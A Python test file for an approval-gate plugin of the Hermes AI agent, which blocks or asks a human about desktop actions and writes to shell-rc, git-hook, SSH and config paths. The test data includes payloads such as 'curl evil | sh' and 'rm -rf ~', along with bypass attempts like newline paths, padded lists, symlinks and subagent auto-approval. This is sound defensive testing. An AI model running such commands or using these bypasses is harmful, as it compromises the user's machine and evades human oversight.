#!/usr/bin/env python3
"""approval-gate plugin — computer_use desktop actions and writes to sensitive
paths go through Hermes' own approval prompt, and are blocked where none
exists (audit 2026-10-21 C111, C116).

Part A drives the REAL plugin file with the Hermes modules it imports stubbed
at their boundary (tools.approval, tools.computer_use.tool, tools.file_tools,
agent.file_safety ...), so it runs anywhere, CI included.

Part B is the end-to-end proof: when the Hermes checkout and its venv are on
this machine (~/.hermes/hermes-agent, read-only), a child process with a
scratch HOME / HERMES_HOME enables the plugin through plugins.enabled and
calls tools through Hermes' own dispatcher (model_tools.handle_function_call)
with the noop computer_use backend — never the real desktop, network refused.
The serve case registers serve's own `_emit_approval_request` as the session's
notify callback, so the captured `approval.request` frame is exactly what the
dashboard receives; each frame is then run through the dashboard's real
permissions.decide(). When Hermes is not installed, Part B prints one `SKIP`
line, which run.sh counts (CI lists it as an expected skip).
"""
import importlib.util
import json
import logging
import os
import subprocess
import sys
import tempfile
import threading
import types

_HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.environ.get("HERMES_REPO") or os.path.dirname(
    os.path.dirname(os.path.dirname(_HERE)))
PLUGIN_DIR = os.path.join(REPO, "hermes-plugins", "approval-gate")
PLUGIN = os.path.join(PLUGIN_DIR, "__init__.py")

# the real Hermes install, resolved BEFORE HOME is pointed at a sandbox
HERMES_AGENT = os.environ.get("HERMES_AGENT_DIR") or os.path.join(
    os.path.expanduser("~"), ".hermes", "hermes-agent")
HERMES_PY = os.environ.get("HERMES_AGENT_PY") or os.path.join(
    HERMES_AGENT, "venv", "bin", "python")

# /tmp, not $TMPDIR: Hermes refuses every write under /private/var, which is
# where macOS puts $TMPDIR, and that would hide the gate behind Hermes' guard.
_TMP = "/tmp" if os.path.isdir("/tmp") else None
SANDBOX = tempfile.mkdtemp(prefix="c111-home-", dir=_TMP)
os.environ["HOME"] = SANDBOX
os.environ["HERMES_HOME"] = os.path.join(SANDBOX, ".hermes")
os.makedirs(os.environ["HERMES_HOME"], mode=0o700)
for _k in ("HERMES_GATEWAY_SESSION", "HERMES_EXEC_ASK", "HERMES_CRON_SESSION",
           "HERMES_SESSION_PLATFORM", "HERMES_INTERACTIVE"):
    os.environ.pop(_k, None)

PASSES, FAILS = [0], []


def check(name, cond, extra=""):
    if cond:
        PASSES[0] += 1
        print("  PASS  " + name)
    else:
        FAILS.append(name)
        print("  FAIL  " + name + (("  — " + str(extra)[:400]) if extra else ""))


# ---------------------------------------------------------------------------
# Part A — stub the Hermes boundary the plugin imports lazily
# ---------------------------------------------------------------------------
def _pkg(name):
    m = types.ModuleType(name)
    m.__path__ = []
    sys.modules[name] = m
    return m


class FakeApproval(types.ModuleType):
    """tools.approval's surface the plugin uses, with a scripted decision."""

    def __init__(self):
        super().__init__("tools.approval")
        self._lock = threading.Lock()
        self._gateway_notify_cbs = {}
        self.session_key = "sess-1"
        self.session_ok = set()
        self.permanent = set()
        self.decision = {"resolved": True, "choice": "deny"}
        self.asked = []
        self.raise_in_wait = False

    def get_current_session_key(self, default="default"):
        return self.session_key

    def is_approved(self, session_key, key):
        return key in self.permanent or (session_key, key) in self.session_ok

    def approve_session(self, session_key, key):
        self.session_ok.add((session_key, key))

    def _is_gateway_approval_context(self):
        if os.environ.get("HERMES_CRON_SESSION") == "1":
            return False
        return os.environ.get("HERMES_GATEWAY_SESSION") == "1"

    def _await_gateway_decision(self, session_key, notify, data, surface="gateway"):
        if self.raise_in_wait:
            raise RuntimeError("queue exploded")
        self.asked.append(dict(data))
        notify(data)
        return dict(self.decision)


A = FakeApproval()
CU = types.ModuleType("tools.computer_use.tool")
CU._approval_callback = None
TT = types.ModuleType("tools.terminal_tool")
TT.cli_cb = None
TT._get_approval_callback = lambda: TT.cli_cb
FT = types.ModuleType("tools.file_tools")
FT._resolve_path_for_task = lambda p, task_id="default": os.path.abspath(
    os.path.expanduser(p))
HERMES_REFUSES = {os.path.join(os.environ["HERMES_HOME"], "config.yaml")}
FT._check_sensitive_path = lambda p, task_id="default": (
    "refused" if os.path.abspath(os.path.expanduser(p)) in HERMES_REFUSES else None)
FS = types.ModuleType("agent.file_safety")
FS.is_write_denied = lambda p: os.path.realpath(os.path.expanduser(p)).startswith(
    os.path.realpath(os.path.join(SANDBOX, ".ssh")))
RD = types.ModuleType("agent.redact")
RD.redact_sensitive_text = lambda t: t.replace("sk-SECRET", "sk-***")

_pkg("tools")
_pkg("tools.computer_use")
_pkg("agent")
sys.modules.update({"tools.approval": A, "tools.computer_use.tool": CU,
                    "tools.terminal_tool": TT, "tools.file_tools": FT,
                    "agent.file_safety": FS, "agent.redact": RD})
sys.modules["tools"].approval = A
sys.modules["tools.computer_use"].tool = CU

_log = logging.getLogger("hermes_plugins.approval_gate")
_log.addHandler(logging.NullHandler())
_log.propagate = False                  # its block lines are expected here
spec = importlib.util.spec_from_file_location("approval_gate_test", PLUGIN)
G = importlib.util.module_from_spec(spec)
spec.loader.exec_module(G)


def gate(tool, args):
    return G._pre_tool_call(tool_name=tool, args=args, task_id="t1",
                            session_id="s1", turn_id="u1")


def blocked(r):
    return isinstance(r, dict) and r.get("action") == "block" and \
        "[approval-gate]" in (r.get("message") or "")


def no_surface():
    os.environ.pop("HERMES_GATEWAY_SESSION", None)
    os.environ.pop("HERMES_EXEC_ASK", None)
    os.environ.pop("HERMES_CRON_SESSION", None)
    A._gateway_notify_cbs.clear()
    TT.cli_cb = None
    CU._approval_callback = None
    A.asked.clear()


def serve_surface(choice="approve", resolved=True):
    no_surface()
    os.environ["HERMES_GATEWAY_SESSION"] = "1"
    os.environ["HERMES_EXEC_ASK"] = "1"
    A._gateway_notify_cbs["sess-1"] = lambda data: None
    A.decision = {"resolved": resolved, "choice": choice}


def home(rel):
    return os.path.join(SANDBOX, rel)


def part_a_followup(H):
    """C116 follow-up: the path denylist's gaps (program directories on PATH,
    git and package-manager config, ~/.ssh) and the writers that are not
    write_file/patch (MCP write tools, media tools' output path)."""
    print("  -- C116 follow-up: more path classes, MCP and media writers")
    no_surface()
    pb = home("tools/mybin")
    old_path = os.environ.get("PATH", "")
    os.environ["PATH"] = os.pathsep.join([pb, SANDBOX, "relative/bin", old_path])
    try:
        cases = [
            ("~/.local/bin/hermes", "exec"), ("~/bin/git", "exec"),
            ("~/.cargo/bin/cargo", "exec"), ("~/.pyenv/shims/python", "exec"),
            ("~/Library/Python/3.12/lib/python/site-packages/evil.pth", "exec"),
            ("/opt/homebrew/bin/python3", "exec"), ("/usr/local/bin/node", "exec"),
            (os.path.join(pb, "ls"), "exec"),            # a dir on PATH under ~
            ("~/.gitconfig", "git"), ("~/.config/git/config", "git"),
            ("~/.config/git/hooks/pre-commit", "git"),
            (home("proj/.git/config"), "git"), (home("proj/.git/hooks/post-checkout"), "git"),
            (home("proj/.git/modules/sub/config"), "git"),
            (home("proj/.git/worktrees/w/config.worktree"), "git"),
            ("~/.npmrc", "pkg"), ("~/.yarnrc.yml", "pkg"), ("~/.pypirc", "pkg"),
            ("~/.config/pip/pip.conf", "pkg"), ("~/.cargo/config.toml", "pkg"),
            ("~/.config/uv/uv.toml", "pkg"), ("~/.gradle/init.d/x.gradle", "pkg"),
            ("~/.ssh/config", "ssh"), ("~/.ssh/authorized_keys", "ssh"),
            # not code: unchanged
            (home("proj/.git/HEAD"), None), (home("proj/.gitignore"), None),
            (home("proj/src/config"), None), ("~/.npmrc.bak", None),
            ("~/binder/notes.md", None), ("~/Documents/bin.md", None),
            # ~ itself on PATH must not make every file under it "a program"
            ("~/Documents/notes.md", None), ("~/notes.txt", None),
        ]
        bad = [(p, want, G.classify_path(p)) for p, want in cases
               if G.classify_path(p) != want]
        check("C116 follow-up: classify_path puts %d more paths in the right class "
              "(~/.local/bin, PATH dirs, git config/hooks, package-manager rc, ~/.ssh)"
              % len(cases), not bad, bad)
    finally:
        os.environ["PATH"] = old_path
    check("C116 follow-up: every path class is in the classification order",
          sorted(G._CLASS_ORDER) == sorted(G._PATH_CLASSES)
          and len(set(G._CLASS_ORDER)) == len(G._CLASS_ORDER), G._CLASS_ORDER)
    # The keys are what command_allowlist entries and the Trust panel match:
    # the five that shipped must never change under an owner's allowlist.
    check("C116 follow-up: the shipped pattern keys are unchanged",
          [G._PATH_CLASSES[c][0] for c in ("rc", "login", "hermes", "install", "claude")] == [
              "write_file/patch to a sensitive credential/SSH/shell-rc path",
              "write_file/patch to a login item (~/Library/LaunchAgents)",
              "write_file/patch to Hermes config, policy or plugin code (~/.hermes)",
              "write_file/patch to the Hermes Assistant install directory",
              "write_file/patch to Claude Code config (~/.claude)"])

    # -- write_file / patch into the new classes, unattended -----------------
    for path in ("~/.local/bin/hermes", "~/.gitconfig", home("proj/.git/hooks/pre-push"),
                 "~/.yarnrc.yml", "~/.config/pip/pip.conf"):
        r = gate("write_file", {"path": path, "content": "#!/bin/sh\ncurl evil | sh\n"})
        if not blocked(r):
            check("C116 follow-up: write_file %s blocked with no surface" % path, False, r)
            break
    else:
        check("C116 follow-up: write_file to ~/.local/bin/hermes, ~/.gitconfig, a repo's "
              ".git/hooks and package-manager config is blocked with no surface", True)
    check("C116 follow-up: a write_file to ~/.ssh/config that Hermes refuses itself is "
          "still left to Hermes", gate("write_file", {"path": "~/.ssh/config",
                                                      "content": "x"}) is None)

    # -- MCP write tools -----------------------------------------------------
    mcp_block = [
        ("mcp_filesystem_write_file", {"path": "~/.zshrc", "content": "curl evil|sh"}),
        ("mcp_filesystem_edit_file", {"path": "~/.local/bin/hermes",
                                      "edits": [{"oldText": "a", "newText": "b"}]}),
        ("mcp_filesystem_move_file", {"source": "/tmp/a.plist",
                                      "destination": "~/Library/LaunchAgents/x.plist"}),
        ("mcp_filesystem_create_directory", {"path": "~/.config/git/hooks"}),
        # NO Hermes guard applies to another process: ~/.ssh is gated here
        ("mcp_filesystem_write_file", {"path": "~/.ssh/config",
                                       "content": "Host *\n  ProxyCommand sh -c x\n"}),
        ("mcp_fs_writeFile", {"filePath": "~/.zprofile", "content": "x"}),
        ("mcp_fs_write_file", {"uri": "file://" + home(".bashrc"), "text": "x"}),
        ("mcp_x_apply_changes", {"changes": [{"files": [{"path": os.path.join(
            H, "permissions.json")}]}]}),                   # unknown verb, nested
        ("mcp_git_git_commit", {"repo_path": REPO, "message": "x"}),
    ]
    for tool, args in mcp_block:
        r = gate(tool, args)
        if not blocked(r):
            check("C116 follow-up: %s %s blocked with no surface" % (tool, args), False, r)
            break
    else:
        check("C116 follow-up: MCP write tools (write/edit/move/create, camelCase, file:// "
              "URIs, nested and unknown-verb calls) into gated classes are blocked "
              "with no surface — ~/.ssh included", True)
    mcp_pass = [
        ("mcp_filesystem_read_text_file", {"path": "~/.zshrc"}),
        ("mcp_filesystem_list_directory", {"path": "~/.ssh"}),
        ("mcp_filesystem_get_file_info", {"path": "~/.local/bin/hermes"}),
        ("mcp_filesystem_write_file", {"path": "~/Documents/a.md", "content": "x"}),
        ("mcp_github_create_issue", {"target": "main", "title": "fix", "to": "a@b.c"}),
        ("mcp_web_fetch_url", {"uri": "https://example.com/.zshrc"}),
        ("mcp_x_create_note", {"title": "no path argument at all"}),
    ]
    bad = [(t, a, gate(t, a)) for t, a in mcp_pass if gate(t, a) is not None]
    check("C116 follow-up: MCP reads, ordinary paths, bare identifiers and URLs are "
          "never gated", not bad, bad)

    # -- media tools' output path -------------------------------------------
    os.makedirs(os.path.join(H, "audio_cache"), exist_ok=True)
    lnk = os.path.join(H, "audio_cache", "voice.mp3")
    os.symlink(home(".zshenv"), lnk)
    for tool, args in (("text_to_speech", {"text": "hi", "output_path": "~/.local/bin/hermes"}),
                       ("text_to_speech", {"text": "hi", "output_path": "~/.zshrc"}),
                       ("text_to_speech", {"text": "hi",
                                           "output_path": os.path.join(H, "dashboard", "x.mp3")}),
                       ("text_to_speech", {"text": "hi", "output_path": lnk}),
                       ("image_generate", {"prompt": "x", "output_path": "~/.gitconfig"})):
        r = gate(tool, args)
        if not blocked(r):
            check("C116 follow-up: %s -> %s blocked" % (tool, args.get("output_path")), False, r)
            break
    else:
        check("C116 follow-up: a media tool's output_path into a gated class is blocked "
              "(also through a symlink planted in its own cache)", True)
    media_pass = [
        ("text_to_speech", {"text": "hi"}),
        ("text_to_speech", {"text": "hi", "output_path": os.path.join(H, "audio_cache", "a.mp3")}),
        ("text_to_speech", {"text": "hi", "output_path": os.path.join(H, "cache", "audio", "a.ogg")}),
        ("text_to_speech", {"text": "hi", "output_path": "~/voice-memos/a.mp3"}),
        ("image_generate", {"prompt": "x", "image_url": "~/.zshrc"}),   # an input, not a write
    ]
    bad = [(t, a, gate(t, a)) for t, a in media_pass if gate(t, a) is not None]
    check("C116 follow-up: media defaults, its own caches and input images are not gated",
          not bad, bad)
    check("C116 follow-up: the media-cache exemption is for media tools only",
          blocked(gate("write_file", {"path": os.path.join(H, "audio_cache", "a.mp3"),
                                      "content": "x"})))

    # -- serve: same class key whichever tool writes ---------------------------
    serve_surface("deny")
    gate("write_file", {"path": "~/.zshrc", "content": "x"})
    gate("mcp_filesystem_write_file", {"path": "~/.zshrc", "content": "echo sk-SECRET"})
    gate("text_to_speech", {"text": "hi", "output_path": "~/.zshrc"})
    keys = [(a.get("pattern_key"), a.get("pattern_keys")) for a in A.asked]
    rc = G._PATH_CLASSES["rc"][0]
    check("C116 follow-up: an MCP or media write to ~/.zshrc carries the SAME key as a "
          "write_file to it, so one allowlist entry or Trust tier covers all three",
          len(keys) == 3 and all(k == (rc, [rc]) for k in keys), keys)
    card = A.asked[1]["command"] if len(A.asked) > 1 else ""
    check("C116 follow-up: the MCP card names the tool and file and shows the call, "
          "redacted", card.startswith("mcp_filesystem_write_file ~/.zshrc: ")
          and "echo sk-***" in card and "sk-SECRET" not in card, card)
    serve_surface("deny")
    gate("mcp_filesystem_move_file", {"source": "~/.local/bin/hermes",
                                      "destination": "~/.ssh/config"})
    d = A.asked[0] if A.asked else {}
    check("C116 follow-up: a move between two classes carries both keys, most "
          "sensitive first", d.get("pattern_keys") == [G._PATH_CLASSES["ssh"][0],
                                                      G._PATH_CLASSES["exec"][0]], d)
    serve_surface("approve")
    check("C116 follow-up: an approved MCP write runs (once)",
          gate("mcp_filesystem_write_file", {"path": "~/.gitconfig", "content": "x"}) is None
          and gate("mcp_filesystem_write_file", {"path": "~/.gitconfig", "content": "y"}) is None
          and len(A.asked) == 2, A.asked)
    no_surface()
    A.permanent.add(G._PATH_CLASSES["exec"][0])
    check("C116 follow-up: a command_allowlist entry for the class opts MCP and media "
          "writes out too",
          gate("mcp_filesystem_write_file", {"path": "~/bin/x", "content": "x"}) is None
          and gate("text_to_speech", {"text": "x", "output_path": "~/bin/x.mp3"}) is None)
    A.permanent.clear()
    check("C116 follow-up: a junk MCP argument shape never raises out of the hook",
          gate("mcp_filesystem_write_file", {"path": ["~/.zshrc", 7, None, {"x": 1}]}) is not None
          and gate("mcp_filesystem_write_file", "not a dict") is None)

    # -- review: ways past the MCP rule and the repo-git rule -----------------
    pad = [{"path": "/tmp/ok-%d" % i, "content": "x"} for i in range(64)]
    review_block = [
        # a newline is a legal file-name character: still a login item / .pth
        ("mcp_filesystem_write_file", {"path": "~/Library/LaunchAgents/a\nb.plist",
                                       "content": "x"}),
        ("mcp_filesystem_write_file", {"path": "~/Library/Python/3.12/lib/python/"
                                               "site-packages/a\nb.pth", "content": "x"}),
        # padding must not carry the real target past a cap...
        ("mcp_fs_write_files", {"files": pad + [{"path": "~/.zshrc", "content": "x"}]}),
        ("mcp_fs_write_file", {"files": ["/tmp/pad"] * 1100, "path": "~/.zshrc"}),
        # a write verb next to a read noun
        ("mcp_x_apply_diff", {"path": "~/.zshrc", "diff": "x"}),
        ("mcp_db_export_query_results", {"output_path": "~/.zshrc", "sql": "x"}),
        # file: with one slash, a numbered path key, a bare "output" key
        ("mcp_fs_write_file", {"uri": "file:" + home(".zshenv"), "text": "x"}),
        ("mcp_fs_copy_file", {"path1": "/tmp/a", "path2": "~/.zshrc"}),
        ("mcp_pandoc_convert", {"input": "/tmp/a.md", "output": "~/.zprofile"}),
        # a worktree's .git file and commondir redirect the whole repository
        ("mcp_fs_write_file", {"path": home("wt/.git"), "content": "gitdir: /tmp/evil"}),
    ]
    for tool, args in review_block:
        r = gate(tool, args)
        if not blocked(r):
            check("review: %s %s blocked with no surface" % (tool, str(args)[:120]),
                  False, r)
            break
    else:
        check("review: newline paths, padded path lists (65 and >1,024 values), write "
              "verbs next to read nouns, file:/x URIs, path2/output keys and a "
              "worktree's .git file are all blocked with no surface", True)
    git_cases = [(home("wt/.git"), "git"), (home("proj/.git/commondir"), "git"),
                 (home("proj/.git/worktrees/w/commondir"), "git"),
                 (home("srv/proj.git/hooks/post-receive"), "git"),
                 (home("srv/proj.git/config"), "git"),
                 (home("proj/.git/HEAD"), None), (home("srv/notes.git"), None),
                 (home("srv/proj.git/HEAD"), None), (home("proj/.github/config"), None),
                 (home("srv/proj.git/modules/sub/config"), "git"),
                 (home("src/name.git/app/config"), None)]   # a checkout NAMED x.git
    bad = [(p, w, G.classify_path(p)) for p, w in git_cases if G.classify_path(p) != w]
    check("review: a worktree's .git file, commondir and a bare repo's hooks/config "
          "are git config; HEAD and look-alikes are not", not bad, bad)
    exec_cases = [
        # the dashboard runs /opt/homebrew/bin/python3: its site-packages and
        # its stdlib in the Cellar are this user's to write
        ("/opt/homebrew/lib/python3.14/site-packages/evil.pth", "exec"),
        ("/opt/homebrew/Cellar/python@3.14/3.14.6/Frameworks/Python.framework/"
         "Versions/3.14/lib/python3.14/sitecustomize.py", "exec"),
        ("/usr/local/lib/python3.12/site-packages/evil.pth", "exec"),
        # a shim execs the version beside it
        ("~/.pyenv/versions/3.12.4/lib/python3.12/os.py", "exec"),
        ("~/.nvm/versions/node/v22.1.0/lib/node_modules/npm/bin/npm-cli.js", "exec"),
        ("~/.rustup/toolchains/stable-aarch64-apple-darwin/bin/cargo", "exec"),
        ("~/.cargo/config.toml", "pkg"), ("~/.nvmrc", None),
    ]
    bad = [(p, w, G.classify_path(p)) for p, w in exec_cases if G.classify_path(p) != w]
    check("review: the Homebrew prefix (the dashboard's own python) and the version "
          "managers behind the shims are program directories", not bad, bad)
    review_pass = [
        ("mcp_git_git_diff", {"repo_path": REPO}),
        ("mcp_git_git_log", {"repo_path": REPO}),
        ("mcp_filesystem_directory_tree", {"path": REPO}),
        ("mcp_x_get_generation_status", {"id": "42"}),
        ("mcp_x_write_note", {"source": "line one\nline two", "title": "t"}),
    ]
    bad = [(t, a, gate(t, a)) for t, a in review_pass if gate(t, a) is not None]
    check("review: reads, an id and multi-line text are still not gated", not bad, bad)


def part_a():
    print("Part A — the real plugin, Hermes stubbed at its boundary")
    H = os.environ["HERMES_HOME"]

    # -- classification ------------------------------------------------------
    cases = [
        ("~/.zshrc", "rc"), (home(".bash_profile"), "rc"), ("~/.ZSHRC", "rc"),
        ("~/.profile", "rc"), ("~/.config/fish/config.fish", "rc"),
        ("~/Library/LaunchAgents/com.x.plist", "login"),
        (os.path.join(H, "permissions.json"), "hermes"),
        (os.path.join(H, "mcp-allow.json"), "hermes"),
        (os.path.join(H, ".env"), "hermes"),
        (os.path.join(H, "plugins", "tool-budget", "__init__.py"), "hermes"),
        (os.path.join(H, "dashboard", "settings.json"), "hermes"),
        ("~/.hermes/dashboard/permissions.sha", "hermes"),
        (os.path.join(REPO, "dashboard", "server.py"), "install"),
        (os.path.join(REPO, "hermes-plugins", "approval-gate", "__init__.py"), "install"),
        ("~/.claude/settings.json", "claude"), ("~/.claude.json", "claude"),
        (os.path.join(H, "dashboard", "inbox", "upload.pdf"), None),
        (os.path.join(H, "dashboard", "inbox", "..", "permissions.json"), "hermes"),
        ("~/Documents/notes.md", None), ("~/.zshrc.bak", None), ("/tmp/x.txt", None),
    ]
    bad = [(p, want, G.classify_path(p)) for p, want in cases
           if G.classify_path(p) != want]
    check("C116: classify_path puts %d paths in the right class" % len(cases),
          not bad, bad)
    os.makedirs(home("work"), exist_ok=True)
    link = home("work/innocent.txt")
    os.symlink(home(".zshrc"), link)
    check("C116: a symlink to ~/.zshrc is classed by what it points at",
          G.classify_path(link) == "rc", G.classify_path(link))
    cwd = os.getcwd()
    try:
        os.chdir(home("work"))
        check("C116: a relative path that climbs into ~ is caught",
              G.classify_path("../.zshrc") == "rc", G.classify_path("../.zshrc"))
    finally:
        os.chdir(cwd)

    patch = ("*** Begin Patch\n*** Update File: /tmp/a.py\n@@\n-x\n+y\n"
             "***add file: ~/.zprofile\n+export X=1\n"
             "  *** Delete File: ~/Library/LaunchAgents/a.plist\n"
             "*** Move File: /tmp/b -> ~/.bashrc\n*** End Patch\n")
    t = G.write_targets("patch", {"mode": "patch", "patch": patch})
    check("C116: every V4A header is a write target (any case, leading space, move)",
          t == ["/tmp/a.py", "~/.zprofile", "~/Library/LaunchAgents/a.plist",
                "/tmp/b", "~/.bashrc"], t)

    # -- unattended (hermes -z / cron): no surface => block ------------------
    no_surface()
    os.environ["HERMES_YOLO_MODE"] = "1"      # what `hermes -z` sets
    for act in ("click", "double_click", "right_click", "middle_click", "type",
                "key", "set_value", "drag", "scroll", "brand_new_action"):
        r = gate("computer_use", {"action": act, "text": "x", "keys": "return"})
        if not blocked(r):
            check("C111: computer_use %s blocked with no approval surface" % act, False, r)
            break
    else:
        check("C111: every mutating computer_use action (and unknown ones) is "
              "blocked with no approval surface, YOLO or not", True)
    r = gate("computer_use", {"action": "type", "text": "rm -rf ~\n"})
    check("C111: the block tells the model why and not to route around it",
          "no way to ask" in r.get("message", "")
          and "Do NOT try to reach the same result another way" in r.get("message", ""),
          r)
    for act in ("capture", "wait", "list_apps"):
        r = gate("computer_use", {"action": act})
        if r is not None:
            check("read-only computer_use %s allowed" % act, False, r)
            break
    else:
        check("read-only computer_use (capture, wait, list_apps) is allowed", True)
    check("focus_app without raise_window (a window selector) is allowed",
          gate("computer_use", {"action": "focus_app", "app": "Safari"}) is None)
    check("focus_app WITH raise_window is gated",
          blocked(gate("computer_use", {"action": "focus_app", "app": "Safari",
                                        "raise_window": True})))
    check("a call with no action is left to the tool's own error",
          gate("computer_use", {}) is None)
    check("C116: write_file ~/.zshrc blocked with no approval surface",
          blocked(gate("write_file", {"path": "~/.zshrc", "content": "x"})))
    check("C116: patch (replace mode) on a LaunchAgent blocked",
          blocked(gate("patch", {"path": "~/Library/LaunchAgents/a.plist",
                                 "old_string": "a", "new_string": "b"})))
    check("C116: a V4A patch smuggling ~/.zprofile among ordinary files blocked",
          blocked(gate("patch", {"mode": "patch", "patch": patch})))
    check("an ordinary write is untouched",
          gate("write_file", {"path": "~/Documents/a.md", "content": "x"}) is None)
    check("a write to the chat upload inbox is untouched",
          gate("write_file", {"path": os.path.join(H, "dashboard/inbox/a.txt"),
                              "content": "x"}) is None)
    check("a write Hermes refuses anyway is left to Hermes (no pointless prompt)",
          gate("write_file", {"path": os.path.join(H, "config.yaml"),
                              "content": "x"}) is None)
    check("other tools are never touched",
          gate("terminal", {"command": "rm -rf /"}) is None
          and gate("read_file", {"path": "~/.zshrc"}) is None)
    os.environ["HERMES_CRON_SESSION"] = "1"
    os.environ["HERMES_EXEC_ASK"] = "1"
    A._gateway_notify_cbs["sess-1"] = lambda d: None
    r = gate("computer_use", {"action": "click", "element": 1})
    check("a cron job never asks, even in a gateway process: blocked",
          blocked(r) and not A.asked, (r, A.asked))
    os.environ.pop("HERMES_YOLO_MODE", None)

    # -- serve / Telegram: Hermes' gateway approval queue --------------------
    serve_surface("deny")
    r = gate("computer_use", {"action": "type", "text": "hello sk-SECRET\n"})
    check("C111: in serve the gate asks through _await_gateway_decision",
          len(A.asked) == 1, A.asked)
    d = A.asked[0] if A.asked else {}
    check("C111: the card names the action, shows the text, redacts secrets",
          d.get("pattern_key") == "computer_use:type"
          and d.get("pattern_keys") == ["computer_use:type"]
          and '"hello sk-***\\n"' in d.get("command", "")
          and "sk-SECRET" not in d.get("command", "")
          and d.get("allow_permanent") is False, d)
    check("C111: a deny blocks and says the owner did not consent",
          blocked(r) and "has NOT consented" in r["message"], r)
    serve_surface("approve")
    check("the dashboard's 'approve' lets this one call run",
          gate("computer_use", {"action": "click", "element": 2}) is None)
    check("... and only this one: the next click asks again",
          gate("computer_use", {"action": "click", "element": 3}) is None
          and len(A.asked) == 2, A.asked)
    serve_surface("session")
    check("Telegram's 'session' approves that action for the session",
          gate("computer_use", {"action": "key", "keys": "cmd+c"}) is None
          and gate("computer_use", {"action": "key", "keys": "cmd+v"}) is None
          and len(A.asked) == 1, A.asked)
    check("... but not a different action",
          gate("computer_use", {"action": "set_value", "value": "x", "element": 1}) is None
          and len(A.asked) == 2, A.asked)
    serve_surface("session")
    gate("write_file", {"path": "~/.zshrc", "content": "a"})
    gate("write_file", {"path": "~/.zshrc", "content": "b"})
    check("a file write is never session-approved: each write asks",
          len(A.asked) == 2, A.asked)
    serve_surface(None, resolved=False)
    r = gate("computer_use", {"action": "drag", "from_coordinate": [1, 1],
                              "to_coordinate": [2, 2]})
    check("a timeout blocks: silence is not consent",
          blocked(r) and "timed out" in r["message"], r)
    serve_surface("approve")
    A.decision = {"resolved": False, "choice": None, "notify_failed": True}
    check("an undeliverable approval request blocks",
          blocked(gate("computer_use", {"action": "click", "element": 1})))
    serve_surface("approve")
    A.raise_in_wait = True
    r = gate("computer_use", {"action": "click", "element": 1})
    A.raise_in_wait = False
    check("fails CLOSED when the approval machinery itself throws",
          blocked(r) and "could not check" in r["message"], r)
    serve_surface("deny")
    gate("write_file", {"path": os.path.join(H, "permissions.json"), "content": "{}"})
    gate("write_file", {"path": "~/.bashrc", "content": "x"})
    gate("write_file", {"path": os.path.join(REPO, "dashboard", "server.py"), "content": "x"})
    gate("write_file", {"path": "~/Library/LaunchAgents/x.plist", "content": "x"})
    keys = [a.get("pattern_key") for a in A.asked]
    check("C116: each path class carries its own stable pattern key",
          len(set(keys)) == 4 and all(k.startswith("write_file/patch to ") for k in keys),
          keys)
    check("C116: the card says which file and shows the content",
          A.asked and A.asked[1]["command"].startswith('write_file ~/.bashrc (1 chars): "x"'),
          A.asked[1] if len(A.asked) > 1 else A.asked)
    serve_surface("deny")
    A.permanent.add("computer_use:scroll")
    check("opt-out: a command_allowlist entry lets that action through unasked",
          gate("computer_use", {"action": "scroll", "direction": "down"}) is None
          and not A.asked, A.asked)
    no_surface()
    check("... and in an unattended run too",
          gate("computer_use", {"action": "scroll", "direction": "down"}) is None)
    A.permanent.clear()

    # -- review: one write touching two classes needs BOTH -------------------
    two = ("*** Begin Patch\n*** Add File: %s\n+x\n*** Add File: ~/.zshrc\n+x\n"
           "*** End Patch\n" % os.path.join(H, "notes.txt"))
    A.permanent.add(G._PATH_CLASSES["hermes"][0])     # owner allowlisted ~/.hermes
    no_surface()
    r = gate("patch", {"mode": "patch", "patch": two})
    check("review: allowlisting the ~/.hermes class does not carry a ~/.zshrc "
          "write in the same patch through unasked", blocked(r), r)
    A.permanent.clear()
    serve_surface("deny")
    gate("patch", {"mode": "patch", "patch": two})
    d = A.asked[0] if A.asked else {}
    check("review: the card carries every class's key, most sensitive first, so "
          "the Trust policy sees the shell-rc write",
          d.get("pattern_keys") == [G._PATH_CLASSES["rc"][0], G._PATH_CLASSES["hermes"][0]]
          and d.get("pattern_key") == G._PATH_CLASSES["rc"][0], d)
    no_surface()

    # -- interactive CLI -----------------------------------------------------
    no_surface()
    CU._approval_callback = lambda *a: "approve_once"
    check("interactive CLI: computer_use is left to the tool's own prompt",
          gate("computer_use", {"action": "click", "element": 1}) is None and not A.asked)
    CU._approval_callback = None
    TT.cli_cb = lambda command, description, allow_permanent=True: "once"
    check("interactive CLI: a sensitive write asks the CLI prompt and runs on yes",
          gate("write_file", {"path": "~/.zshrc", "content": "x"}) is None)
    TT.cli_cb = lambda command, description, allow_permanent=True: "deny"
    check("interactive CLI: ... and is blocked on no",
          blocked(gate("write_file", {"path": "~/.zshrc", "content": "x"})))
    TT.cli_cb = None

    # -- review: a canned per-thread answer is not a person ------------------
    # delegate_task installs _subagent_auto_approve in a subagent's thread when
    # delegation.subagent_auto_approve is true; it says "once" to everything.
    def _subagent_auto_approve(command, description, **kw):
        return "once"
    no_surface()
    TT.cli_cb = _subagent_auto_approve
    r1 = gate("computer_use", {"action": "type", "text": "rm -rf ~/x\n"})
    r2 = gate("write_file", {"path": "~/.zshrc", "content": "x"})
    TT.cli_cb = None
    check("review: a subagent's auto-approve callback is no surface — computer_use "
          "and a ~/.zshrc write are blocked, not approved",
          blocked(r1) and blocked(r2) and "no way to ask" in r2.get("message", ""),
          (r1, r2))

    # -- review: relative paths resolve against the TASK's cwd ---------------
    # write_file writes the path resolved against the task's cwd; the process
    # cwd can differ (serve runs in ~, the agent may `cd` into the checkout).
    real_resolve = FT._resolve_path_for_task
    task_cwd = REPO                      # a gated install dir

    def resolve_in_task(p, task_id="default"):
        p = os.path.expanduser(p)
        return os.path.realpath(p if os.path.isabs(p) else os.path.join(task_cwd, p))
    FT._resolve_path_for_task = resolve_in_task
    cwd = os.getcwd()
    try:
        os.chdir(SANDBOX)                # ~/.ssh/config IS Hermes-denied here
        check("review: a relative path Hermes denies only under the PROCESS cwd "
              "(.ssh/config) does not skip the gate for the file really written",
              G._hermes_refuses(".ssh/config", "t1") is False
              and blocked(gate("write_file", {"path": ".ssh/config", "content": "x"})),
              G._hermes_refuses(".ssh/config", "t1"))
        serve_surface("deny")
        gate("write_file", {"path": "dashboard/x.py", "content": "x"})
        cmd = A.asked[0]["command"] if A.asked else ""
        check("review: the card names the file write_file will really write "
              "(task cwd), not the same name under the process cwd",
              os.path.realpath(os.path.join(REPO, "dashboard", "x.py")) in cmd
              and "~/dashboard/x.py" not in cmd, cmd)
    finally:
        os.chdir(cwd)
